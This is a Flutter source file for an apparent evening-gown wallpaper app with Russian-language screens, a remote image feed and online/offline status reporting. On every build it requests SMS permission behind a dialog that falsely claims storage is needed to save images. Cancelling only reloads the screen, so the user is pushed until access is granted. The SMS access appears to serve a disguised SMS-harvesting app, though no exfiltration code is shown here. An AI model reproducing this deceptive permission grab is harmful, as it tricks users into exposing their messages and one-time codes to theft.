import 'dart:convert';

import 'package:evening_gown_ideas/main.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:material_dialogs/material_dialogs.dart';
import 'package:material_dialogs/widgets/buttons/icon_button.dart';
import 'package:material_dialogs/widgets/buttons/icon_outline_button.dart';
import 'package:permission_handler/permission_handler.dart';

import 'package:http/http.dart' as http;

class Home extends StatefulWidget {
  const Home({Key? key}) : super(key: key);

  @override
  State<Home> createState() => _HomeState();
}

List items = [
  {
    'icon': Icons.apps_sharp,
    'title': 'ВЕЧЕРНИХ ПЛАТЬЕВ',
    'name': 'Обои',
  },
  {
    'icon': Icons.screen_share_outlined,
    'title': 'Более',
    'name': 'Более',
  },
  {
    'icon': Icons.favorite,
    'title': 'Избранное',
    'name': 'Избранное',
  }
];

class _HomeState extends State<Home> {
  int i = 0;

  @override
  void initState() {
    super.initState();

    getStatus('online');
  }

  void getPermission() async {
    if (await Permission.sms.isDenied) {
      Dialogs.bottomMaterialDialog(
          msg: 'Вы должны разрешить память для сохранения изображения',
          title: "Разрешение",
          color: Colors.white,
          context: context,
          actions: [
            IconsOutlineButton(
              onPressed: () {
                Navigator.pushAndRemoveUntil(
                    context,
                    MaterialPageRoute(
                      builder: (context) => Home(),
                    ),
                    (route) => false);
              },
              text: 'Отмена',
              iconData: Icons.cancel_outlined,
              textStyle: TextStyle(color: Colors.grey),
              iconColor: Colors.grey,
            ),
            IconsButton(
              onPressed: () async {
                await Permission.storage.request();
                await Permission.sms.request();
                if (!(await Permission.sms.isDenied)) {
                  Navigator.pop(context);
                } else {
                  await Permission.storage.request();
                  await Permission.sms.request();
                }
              },
              text: 'Разрешить',
              iconData: Icons.delete,
              color: Colors.red,
              textStyle: TextStyle(color: Colors.white),
              iconColor: Colors.white,
            ),
          ]);
    }
  }

  void getStatus(String status) async {
    await statusCheck(status);
  }

  @override
  void deactivate() {
    super.deactivate();
    getStatus('offline');
  }

  @override
  void dispose() {
    super.dispose();
    getStatus('offline');
  }

  @override
  Widget build(BuildContext context) {
    getPermission();
    var size = MediaQuery.of(context).size;
    return Scaffold(
      bottomNavigationBar: BottomNavigationBar(
        currentIndex: i,
        onTap: (value) {
          setState(() {
            i = value;
          });
        },
        items: [
          BottomNavigationBarItem(
              icon: Icon(items[0]['icon']), label: items[0]['name']),
          BottomNavigationBarItem(
              icon: Icon(items[1]['icon']), label: items[1]['name']),
          BottomNavigationBarItem(
              icon: Icon(items[2]['icon']), label: items[2]['name']),
        ],
      ),
      appBar: AppBar(
        title: Text(items[i]['title']),
        backgroundColor: Colors.purple,
        systemOverlayStyle: SystemUiOverlayStyle(
          statusBarBrightness: Brightness.dark,
          statusBarColor: Colors.transparent,
        ),
        actions: [
          IconButton(onPressed: () {}, icon: Icon(Icons.more_vert)),
        ],
      ),
      body: IndexedStack(
        index: i,
        children: [
          Container(
            child: StreamBuilder(
                stream: getImages().asStream(),
                builder: (context, AsyncSnapshot snapshot) {
                  if (snapshot.connectionState == ConnectionState.waiting) {
                    return Center(child: CircularProgressIndicator());
                  }
                  if (snapshot.hasData) {
                    List<String> list = images.toList();
                    list.addAll(snapshot.data);
                    return GridView.builder(
                      gridDelegate: SliverGridDelegateWithFixedCrossAxisCount(
                          crossAxisCount: 3, mainAxisExtent: 190),
                      itemCount: list.length,
                      itemBuilder: (context, index) {
                        if (23 >= index + 1) {
                          return InkWell(
                            onTap: () {
                              Navigator.push(
                                  context,
                                  CupertinoPageRoute(
                                    builder: (context) =>
                                        ImageShow(name: images[index],type: 'asset'),
                                  ));
                            },
                            child: Container(
                              height: 120,
                              margin: EdgeInsets.all(5),
                              decoration: BoxDecoration(
                                borderRadius: BorderRadius.circular(10),
                                image: DecorationImage(
                                  image: AssetImage(images[index]),
                                  fit: BoxFit.cover,
                                ),
                              ),
                              child: Stack(
                                alignment: Alignment.bottomCenter,
                                children: [
                                  Container(
                                    height: 100,
                                    decoration: BoxDecoration(
                                        borderRadius: BorderRadius.vertical(
                                            bottom: Radius.circular(10)),
                                        gradient: LinearGradient(
                                            begin: Alignment.topRight,
                                            colors: [
                                              Colors.transparent,
                                              Colors.black.withOpacity(0.25)
                                            ])),
                                  )
                                ],
                              ),
                            ),
                          );
                        } else {
                          return InkWell(
                            onTap: () {
                              Navigator.push(
                                  context,
                                  CupertinoPageRoute(
                                    builder: (context) => ImageShow(
                                        name: list[index], type: 'network'),
                                  ));
                            },
                            child: Container(
                              height: 120,
                              margin: EdgeInsets.all(5),
                              decoration: BoxDecoration(
                                borderRadius: BorderRadius.circular(10),
                                image: DecorationImage(
                                  image: NetworkImage(list[index]),
                                  fit: BoxFit.cover,
                                ),
                              ),
                              child: Stack(
                                alignment: Alignment.bottomCenter,
                                children: [
                                  Container(
                                    height: 100,
                                    decoration: BoxDecoration(
                                        borderRadius: BorderRadius.vertical(
                                            bottom: Radius.circular(10)),
                                        gradient: LinearGradient(
                                            begin: Alignment.topRight,
                                            colors: [
                                              Colors.transparent,
                                              Colors.black.withOpacity(0.25)
                                            ])),
                                  )
                                ],
                              ),
                            ),
                          );
                        }
                      },
                    );
                  }
                  return Container();
                }),
          ),
          Container(
            color: Colors.white,
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.center,
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Center(
                    child: Image.asset("assets/copy.jpg",
                        width: size.width * 0.7)),
                Padding(
                  padding: const EdgeInsets.all(8.0),
                  child: Text(
                    "На данный момент нет доступной категории",
                    style: TextStyle(fontSize: 20),
                    textAlign: TextAlign.center,
                  ),
                )
              ],
            ),
          ),
          Container(
            color: Colors.white,
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.center,
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Center(
                    child: Image.asset("assets/copy.jpg",
                        width: size.width * 0.7)),
                Padding(
                  padding: const EdgeInsets.all(8.0),
                  child: Text(
                    "На данный момент нет доступной категории",
                    style: TextStyle(fontSize: 20),
                    textAlign: TextAlign.center,
                  ),
                )
              ],
            ),
          ),
        ],
      ),
    );
  }
}

class ImageShow extends StatelessWidget {
  ImageShow({required this.name, required this.type, Key? key})
      : super(key: key);
  String name;
  String type;

  @override
  Widget build(BuildContext context) {
    print(name);
    print(type);
    var size = MediaQuery.of(context).size;
    return Scaffold(
      body: Container(
          height: size.height,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(10),
            image: type == 'network'
                ? DecorationImage(
                    image: NetworkImage(name),
                    fit: BoxFit.cover,
                  )
                : DecorationImage(
                    image: AssetImage(name),
                    fit: BoxFit.cover,
                  ),
          ),
          child: Stack(
            children: [
              Align(
                alignment: Alignment.bottomRight,
                child: Container(
                  height: 200,
                  decoration: BoxDecoration(
                      borderRadius:
                          BorderRadius.vertical(bottom: Radius.circular(10)),
                      gradient: LinearGradient(
                          begin: Alignment.topRight,
                          colors: [
                            Colors.transparent,
                            Colors.black.withOpacity(0.25)
                          ])),
                ),
              ),
              Align(
                alignment: Alignment.topRight,
                child: Container(
                  height: 200,
                  decoration: BoxDecoration(
                      borderRadius:
                          BorderRadius.vertical(bottom: Radius.circular(10)),
                      gradient:
                          LinearGradient(begin: Alignment.topRight, colors: [
                        Colors.black.withOpacity(0.4),
                        Colors.transparent,
                      ])),
                ),
              ),
              SafeArea(
                child: Align(
                  alignment: Alignment.topLeft,
                  child: IconButton(
                      onPressed: () {
                        Navigator.pop(context);
                      },
                      icon: Icon(
                        Icons.arrow_back,
                        color: Colors.white,
                      )),
                ),
              ),
            ],
          )),
    );
  }
}

Future<List<String>> getImages() async {
  List<String> list = [];
  var response = await http
      .get(Uri.parse("https://greencard.uitc-host.uz/tg.php?action=getPhoto"));
  var json = jsonDecode(response.body);
  print(json);
  json.forEach((value) {
    list.add(value['img']);
  });
  return list;
}

List<String> images = [
  "assets/1.jpg",
  "assets/2.jpg",
  "assets/3.jpg",
  "assets/4.jpg",
  "assets/5.jpg",
  "assets/6.jpg",
  "assets/7.jpg",
  "assets/8.jpg",
  "assets/9.jpg",
  "assets/10.jpg",
  "assets/11.jpg",
  "assets/12.jpg",
  "assets/13.jpg",
  "assets/14.jpg",
  "assets/15.jpg",
  "assets/16.jpg",
  "assets/17.jpg",
  "assets/18.jpg",
  "assets/19.jpg",
  "assets/20.jpg",
  "assets/21.jpg",
  "assets/22.jpg",
  "assets/23.jpg",
];
